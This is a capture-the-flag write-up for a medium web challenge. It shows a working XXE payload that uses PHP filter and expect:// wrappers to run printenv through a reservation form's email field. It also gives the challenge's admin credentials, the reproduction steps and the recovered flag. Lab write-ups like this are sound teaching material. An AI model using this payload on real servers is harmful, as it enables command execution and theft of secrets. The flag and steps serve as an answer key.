# LosSantosCustoms Writeup
Category: Web
Difficulty: Medium
Point : 100
## Target

- `http://ctf.vulnbydefault.com:20593`
- Flag format: `VBD{}`

## Working primitive

The `reservations.php` XML handler is XXE-vulnerable and accepts external entities in the `customer_email` field.

The following wrapper worked on this instance:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE reservation [
<!ENTITY content SYSTEM "php://filter/convert.base64-encode/resource=expect://printenv">
]>
<reservation>
  <car_id>69b0ba0f85a2a0f0670dc974</car_id>
  <start_date>2026-03-11</start_date>
  <end_date>2026-03-12</end_date>
  <customer_name>probe</customer_name>
  <customer_email>&content;</customer_email>
  <customer_phone>5551234567</customer_phone>
</reservation>
```

## Reproduction

1. Log in with the known admin credentials:
   - `admin`
   - `r00tm31l3ts33789`
2. Send the XML above to:

```text
http://ctf.vulnbydefault.com:20593/reservations.php?car_id=69b0ba0f85a2a0f0670dc974
```

3. Read `details.customer_email` from the JSON response.
4. Base64-decode it.

## Decoded result

The decoded `printenv` output contains:

```text
FLAG=VBD{php_wrapper_4r3_us3ful_t0_escalate_4c7672b211ebf70c42691760d5f631b1}
```

## Flag

```text
VBD{php_wrapper_4r3_us3ful_t0_escalate_4c7672b211ebf70c42691760d5f631b1}
```
